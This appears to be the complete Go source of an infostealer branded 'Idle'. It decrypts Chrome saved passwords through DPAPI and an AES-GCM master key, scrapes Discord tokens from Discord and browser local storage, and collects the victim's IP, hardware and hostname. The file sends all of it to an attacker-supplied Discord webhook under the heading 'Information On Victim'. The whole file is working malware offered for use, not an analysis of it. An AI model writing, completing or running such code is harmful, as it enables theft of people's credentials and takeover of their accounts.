package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"log"
	"mime/multipart"
	"os"
	"path/filepath"
	"regexp"
	"strconv"

	"database/sql"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"syscall"

	discordwebhook "github.com/bensch777/discord-webhook-golang"
	_ "github.com/mattn/go-sqlite3"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/zavla/dpapi"
)
type Login struct {
	Host     string
	Username string
	Password string
}
var masterKey []byte
var passwordFile string
var pwCount int
var LoginPaths = []string{"\\Default\\Login Data", "\\Profile 1\\Login Data", "\\Profile 2\\Login Data", "\\Profile 3\\Login Data", "\\Profile 4\\Login Data", "\\Profile 5\\Login Data", "\\Profile 6\\Login Data", "\\Profile 7\\Login Data", "\\Profile 8\\Login Data", "\\Profile 9\\Login Data", "\\Profile 10\\Login Data"}
var gpu string
var mCpu string
//var memory float64
var mIp string
var mHostname string
var osName string
var mToken = ""
var uWebhook = "REPLACE-ME"
func Discord() {
	GetToken()
	SendWebHook()
}

func GetToken() {
	appdata := os.Getenv("APPDATA")
	local := os.Getenv("LOCALAPPDATA")
	Paths := map[string]string{
		"Discord":        appdata + "\\Discord",
		"Discord Canary": appdata + "\\discordcanary",
		"Discord PTB":    appdata + "\\discordptb",
		"Google Chrome":  local + "\\Google\\Chrome\\User Data\\Default",
		"Opera":          appdata + "\\Opera Software\\Opera Stable",
		"Brave":          local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	}

	for _, path := range Paths {
		if _, err := os.Stat(path); err == nil {
			path += "\\Local Storage\\leveldb\\"
			files, err := ioutil.ReadDir(path)
			if err != nil {
				continue
			}
			for _, file := range files {
				if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
					data, err := ioutil.ReadFile(path + file.Name())
					if err != nil {
						continue
					}


					RegNotMfa, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
					if err == nil {
						if string(RegNotMfa.Find(data)) != "" {
							t := string(RegNotMfa.Find(data))
							mToken += t + "\n"
						}
					}
					RegMfa, err := regexp.Compile(`mfa\.[\w-]{84}`)
					if err == nil {
						if string(RegMfa.Find(data)) != "" {
							t := string(RegMfa.Find(data))
							mToken += t + "\n"


						}
					}
				}
			}
		} else {
			continue
		}
	}
}


func SendPasswords() {
	// Creating The File To Then Send To The Discord Webhook
	tempDir := os.TempDir()
	tempFile := filepath.Join(tempDir, "passwords.txt")
	fileContent := []byte(passwordFile)
	err := ioutil.WriteFile(tempFile, fileContent, 0644)
	if err != nil {
		return
	}
	defer os.Remove(tempFile)



	content, err := ioutil.ReadFile(tempFile)
	if err != nil {
		return
	}

	// Send Passwords To Webhook
	fileName := "passwords.txt"

	reqBody := new(bytes.Buffer)
	writer := multipart.NewWriter(reqBody)
	part, err := writer.CreateFormFile("file", fileName)
	if err != nil {
		return
	}
	part.Write(content)
	writer.Close()

	req, err := http.NewRequest("POST", uWebhook, reqBody)
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}


func SendWebHook() {
	SendPasswords()
	embed := discordwebhook.Embed{
		Title:     "Information On Victim",
		Color:     8323327,
		Author: discordwebhook.Author{
			Name:     "Idle",
			Icon_URL: "https://i.ibb.co/85J4tRc/download.jpg",
		},
		Fields: []discordwebhook.Field{
			discordwebhook.Field{
				Name:   "Token(s)",
				Value: "\n```\n" + mToken + "\n```",
				Inline: false,
			},
			discordwebhook.Field{
				Name:   "Logins",
				Value: "Idle Has Found __"+strconv.Itoa(pwCount)+"__ Passwords.",
				Inline: false,
			},
			discordwebhook.Field{
				Name:   "CPU",
				Value: "\n```\n" + mCpu + "\n```",
				Inline: false,
			},
			discordwebhook.Field{
				Name:   "GPU",
				Value: "\n```\n" + gpu + "\n```",
				Inline: false,
			},
			discordwebhook.Field{
				Name:   "Host Name",
				Value: "\n```\n" + mHostname + "\n```",
				Inline: false,
			},
			discordwebhook.Field{
				Name:   "Os Name",
				Value: "\n```\n" + osName + "\n```",
				Inline: false,
			},
			discordwebhook.Field{
				Name:   "IP Address",
				Value: "\n```\n" + mIp + "\n```",
				Inline: false,
			},
		},
		Footer: discordwebhook.Footer{
			Text:     " - Idle <3",
		},
}

	hook := discordwebhook.Hook{
		Username:   "Idle",
		Avatar_url: "https://i.ibb.co/85J4tRc/download.jpg",
		Content:    "@everyone",
		Embeds:     []discordwebhook.Embed{embed},
	}

	payload, err := json.Marshal(hook)
	if err != nil {}
	discordwebhook.ExecuteWebhook(uWebhook, payload)
}
func getGPU() string {
	Info := exec.Command("cmd", "/C", "wmic path win32_VideoController get name")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return strings.TrimSpace(strings.Replace(string(History), "Name", "", -1))
}


func TargetInformation(){
	ip, err := http.Get("https://checkip.amazonaws.com/")

	if err != nil{}

	body, err := ioutil.ReadAll(ip.Body)

	if err != nil{}
	mIp = string(body)

	cpuInfo, err := cpu.Info()
	if err != nil {
		log.Fatal(err)
	}
	mCpu = cpuInfo[0].ModelName

	gpu = getGPU()

	hostInfo, err := host.Info()
	if err != nil {
		log.Fatal(err)
	}

	mHostname = hostInfo.Hostname
	osName = hostInfo.OS
}


var secretKey []byte
var LocalStatePath string = strings.Replace(os.Getenv("APPDATA") + "\\Google\\Chrome\\User Data", "Roaming", "Local", -1)
func getMasterKey() ([]byte) {
	data, err := ioutil.ReadFile(LocalStatePath + "\\Local State")

	if err != nil{}

	var LocalStateJson struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

    err = json.Unmarshal(data, &LocalStateJson)
	
	if err != nil {}


	EncryptedSecretKey, err := base64.StdEncoding.DecodeString(LocalStateJson.OsCrypt.EncryptedKey)

	if err != nil{}

	secretKey = EncryptedSecretKey[5:]
	DecryptedSecretKey, err := dpapi.Decrypt(secretKey)

	if err != nil{}

	return DecryptedSecretKey
}


func DecryptPassword(buff []byte, masterKey []byte) string {
    iv := buff[3:15]
    payload := buff[15:]
    block, _ := aes.NewCipher(masterKey)
    gcm, _ := cipher.NewGCM(block)
    decryptedPass, _ := gcm.Open(nil, iv, payload, nil)
    return string(decryptedPass)
}








func ChromeCrackLogin(path string) ([]Login, error){
	var credentials []Login
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		return credentials, err
	}
	defer db.Close()
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return credentials, err
	}
	defer rows.Close()

	for rows.Next() {
		var host string
		var username string
		var password []byte
		err = rows.Scan(&host, &username, &password)
		if err != nil {
			return credentials, err
		}
		decrypted := DecryptPassword(password, masterKey)
		credential := Login{host, username, decrypted}
		credentials = append(credentials, credential)
	}
	return credentials, nil
}


func Grabber() {
	key := getMasterKey()
	masterKey = key

    for _, path := range LoginPaths {
		Path := LocalStatePath + path

		_, err := os.Stat(Path)
		
		if err == nil {
			logins, err := ChromeCrackLogin(Path)
			if err != nil{}
			for _, cred := range logins{
				pwCount += 1
				passwordFile += fmt.Sprintf(`
====================== Idle ======================
Host: %s
Username / Email: %s
Password: %s
====================== Idle ======================
				`, cred.Host, cred.Username, cred.Password)
			}		} else if os.IsNotExist(err) {
			continue
		} else {
			continue
		}

	}
}


func main(){
	TargetInformation()
	Grabber()
	GetToken()
	SendWebHook()
}
